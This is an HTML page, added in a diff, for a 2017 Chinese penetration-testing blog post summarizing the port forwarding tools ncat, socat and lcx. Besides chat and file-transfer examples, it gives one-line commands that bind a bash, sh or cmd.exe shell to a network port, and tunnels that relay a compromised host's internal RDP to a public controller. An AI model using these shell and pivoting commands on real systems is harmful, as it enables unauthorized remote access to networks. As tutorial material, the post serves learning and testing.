@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta content="倾旋的博客" property="og:site_name">
+
+  <meta content="端口转发工具小结" property="og:title">
+
+
+  <meta content="article" property="og:type">
+
+
+  <meta content="介绍几款端口转发工具" property="og:description">
+
+
+  <meta content="http://localhost:4000/archivers/2017-07-31/1" property="og:url">
+
+
+  <meta content="2017-07-31T00:00:00+08:00" property="article:published_time">
+  <meta content="http://localhost:4000/about/" property="article:author">
+
+
+  <meta property="og:image" content="">
+
+
+  
+  <meta content="内网渗透" property="article:section">
+  
+
+
+  
+
+  <title>端口转发工具小结</title>
+  <meta name="description" content="介绍几款端口转发工具">
+<script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min.js"></script>
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+  
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/ptsans.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firamono.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lato.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/sourcecodepro.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/gentiumbasic.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/alegreya.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lora.css' rel='stylesheet' type='text/css'>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firasans400.css' rel='stylesheet' type='text/css'>
+  <script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min2.2.0.js"></script>
+  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/opensans.css' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/archivers/2017-07-31/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+<section>
+<nav class="navbar navbar-default navbar-fixed-top">
+
+  <div class="container">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="/">倾旋的博客</a>
+    </div>
+
+
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        
+        
+        <li><a href="/about/">关于我</a></li>
+
+        
+
+        
+        
+        <li><a href="/category/">Category</a></li>
+
+        
+
+        
+        
+        <li><a href="/contact/">Contact</a></li>
+
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+        <li><a href="/other/">其他信息</a></li>
+
+        
+
+        
+        
+        <li><a href="/tools/socat">socat 使用手册</a></li>
+
+        
+
+        
+
+
+      </ul>
+
+    <!--  <ul class="nav navbar-nav navbar-right">
+        <li><a href="#">Know More!</a></li>
+
+      </ul>-->
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+</section>
+
+<section>
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="jumbotron">
+    <div class="container">
+      <h1 class="post-title-main" itemprop="name headline">端口转发工具小结</h1>
+      <p class="post-meta"><time datetime="2017-07-31T00:00:00+08:00" itemprop="datePublished">Jul 31, 2017</time></p>
+      
+    </div>
+
+</div>
+
+
+  <div class="post-content container" itemprop="articleBody">
+    <p>介绍几款端口转发工具
+<!--more--></p>
+<h2 id="0x00-ncat">0X00 ncat</h2>
+
+<h3 id="反弹shell">反弹shell</h3>
+
+<p>服务器：<code class="highlighter-rouge">ncat -lnv -c bash 4489</code>  将bash转发到4489端口</p>
+
+<p>客户端：<code class="highlighter-rouge">ncat -nv 172.17.0.1 4489</code> 连接到目标的4489即可获得交互式bash</p>
+
+<p>Windows下用 <code class="highlighter-rouge">-c C:\windows\system32\cmd.exe</code></p>
+
+<p>参数介绍：</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><code class="highlighter-rouge">-l,--listen &lt;port&gt;</code></td>
+      <td>监听某个端口</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">-n, --nodns</code>　</td>
+      <td>不通过DNS解析主机名</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">-v,--verbose</code></td>
+      <td>设置的详细程度(可以使用几次)</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">-c,--sh-exec</code></td>
+      <td>执行传递的命令行</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="建立聊天室">建立聊天室</h3>
+
+<p>服务端：<code class="highlighter-rouge">ncat -lnv --broker --chat 8432</code></p>
+
+<p>客户端：<code class="highlighter-rouge">ncat -nv 172.17.0.1 8432</code></p>
+
+<p>参数介绍：</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><code class="highlighter-rouge">--broker</code></td>
+      <td>使用ncat的代理连接模式，允许多个组织连接到ncat的服务器和其他人交流，ncat能创建一个经纪人在连接和系统之间通过NAT或者其他的直接连接。这个选项是和监听模式一起使用的。这会使监听端口的经纪人模式启动</td>
+    </tr>
+    <tr>
+      <td><code class="highlighter-rouge">--chat</code></td>
+      <td>　开启一个简单的ncat聊天服务器</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="采用ssl加密">采用SSL加密</h3>
+
+<ul>
+  <li>服务器：<code class="highlighter-rouge">ncat -lnv -c bash 4489 --ssl</code></li>
+  <li>客户端：<code class="highlighter-rouge">ncat -nv 172.17.0.1 4489 --ssl</code></li>
+</ul>
+
+<h3 id="传输文件">传输文件</h3>
+
+<p>服务端：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Kali:~$ ncat -lnv 1788 &gt; tmp.txt
+Ncat: Version 7.01 ( https://nmap.org/ncat )
+Ncat: Listening on :::1788
+Ncat: Listening on 0.0.0.0:1788
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:48004.
+</code></pre></div></div>
+
+<p>客户端：</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@504d96ae69cc:/docker_files# cat tmp.txt 
+hello :)
+root@504d96ae69cc:/docker_files# ncat -nv 172.17.0.1 1788 &lt; tmp.txt 
+Ncat: Version 7.50 ( https://nmap.org/ncat )
+Ncat: Connected to 172.17.0.1:1788.
+Ncat: 9 bytes sent, 0 bytes received in 0.01 seconds.
+root@504d96ae69cc:/docker_files# 
+</code></pre></div></div>
+
+<h3 id="参数列表中文">参数列表(中文)</h3>
+
+<p><a href="/tools/ncat.txt">ncat参数</a></p>
+
+<h2 id="0x01-socat">0x01 socat</h2>
+
+<h3 id="安装">安装</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://www.dest-unreach.org/socat/download/socat-2.0.0-b9.tar.gz
+<span class="nb">tar </span>xvf socat-2.0.0-b9.tar.gz
+<span class="nb">cd </span>socat-2.0.0-b9
+./configure
+make
+make <span class="nb">install</span>
+</code></pre></div></div>
+
+<h3 id="建立通信聊天室">建立通信(聊天室)</h3>
+
+<table>
+  <tbody>
+    <tr>
+      <td>服务端</td>
+      <td><code class="highlighter-rouge">socat - tcp4-listen:4444</code></td>
+    </tr>
+    <tr>
+      <td>客户端</td>
+      <td><code class="highlighter-rouge">socat tcp:SERVER_IP:4444</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="传输文件-1">传输文件</h3>
+
+<table>
+  <tbody>
+    <tr>
+      <td>服务端</td>
+      <td><code class="highlighter-rouge">socat tcp4-listen:4444 open:data.txt,creat,append</code></td>
+    </tr>
+    <tr>
+      <td>客户端</td>
+      <td><code class="highlighter-rouge">cat test.txt | socat - tcp:SERVER_IP:4444</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<blockquote>
+  <p>传输二进制文件需要将append改成binary</p>
+</blockquote>
+
+<h3 id="反弹shell-1">反弹Shell</h3>
+
+<table>
+  <tbody>
+    <tr>
+      <td>服务端</td>
+      <td><code class="highlighter-rouge">socat tcp-l:4444 exec:sh,pty,stderr</code></td>
+    </tr>
+    <tr>
+      <td>客户端</td>
+      <td><code class="highlighter-rouge">socat - tcp:SERVER_IP:4444</code></td>
+    </tr>
+    <tr>
+      <td>tcp-l 是 <code class="highlighter-rouge">tcp4-listen</code> 的简写</td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="端口转发">端口转发</h3>
+
+<p><code class="highlighter-rouge">socat - tcp-l:8888,fork tcp4:192.168.3.1:4477</code></p>
+
+<p>当本机接收到8888端口的数据，将全部转发给192.168.3.1主机上的4477端口</p>
+
+<h3 id="udp通信">UDP通信</h3>
+
+<table>
+  <tbody>
+    <tr>
+      <td>服务端</td>
+      <td><code class="highlighter-rouge">socat - udp-l:4456</code></td>
+    </tr>
+    <tr>
+      <td>客户端</td>
+      <td><code class="highlighter-rouge">socat - udp-datagram:192.168.3.1:4456</code></td>
+    </tr>
+    <tr>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="公网转发到内网">公网转发到内网</h3>
+
+<table>
+  <tbody>
+    <tr>
+      <td>服务端</td>
+      <td><code class="highlighter-rouge">socat tcp-listen:1234 tcp-listen:22</code></td>
+      <td>外网IP(<code class="highlighter-rouge">60.*.*.*</code>)</td>
+    </tr>
+    <tr>
+      <td>客户端</td>
+      <td><code class="highlighter-rouge">socat tcp:60.*.*.*:1234 tcp:192.168.3.1:22</code></td>
+      <td>内网IP(192.168.3.1)</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="内网转发到公网">内网转发到公网</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                  ------------
+                 |   Server   |
+                 |  60.*.*.*  |
+                  ------------
+                 /            \
+          {|&lt;Firewall&gt;|}    {|&lt;Firewall&gt;|}
+                |                 |
+          --------------      ----------------        
+         | (192.168.3.1)|     | (192.168.3.2) |
+          --------------      ----------------
+       (hosting a service    (wanting to access
+         on port 4200)         Client A port 4200)
+</code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>服务端</td>
+      <td><code class="highlighter-rouge">socat - tcp-l:10000 tcp-l:4200</code></td>
+    </tr>
+    <tr>
+      <td>客户端</td>
+      <td><code class="highlighter-rouge">socat tcp4:60.*.*.*:10000 tcp4:localhost:4200</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="参考文档">参考文档</h3>
+
+<p><a href="/tools/socat">socat使用手册</a></p>
+
+<h2 id="0x02-lcxgo语言编写">0x02 lcx（go语言编写）</h2>
+
+<p>被控端192.168.10.2 ：</p>
+
+<p>lcx <公网IP> 123</公网IP></p>
+
+<p>控制端 111.111.111.111：</p>
+
+<p>lcx 456 123 192.168.10.2 3389</p>
+
+<p>此时访问111.111.111.111的456就等于192.168.10.2:3389</p>
+
+<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/lcx._g.rar">Download</a>
+<a href="https://www.secpulse.com/archives/6341.html">相关文章</a></p>
+
+
+  </div>
+
+</article>
+
+</section>
+<nav class="navbar navbar-default navbar-fixed-bottom">
+  <div class="container footer-content">
+    Copyright @ 2018 by 倾旋<br>
+    Powered By Jekyll
+  </div>
+</nav>
+
+  </body>
+
+</html>
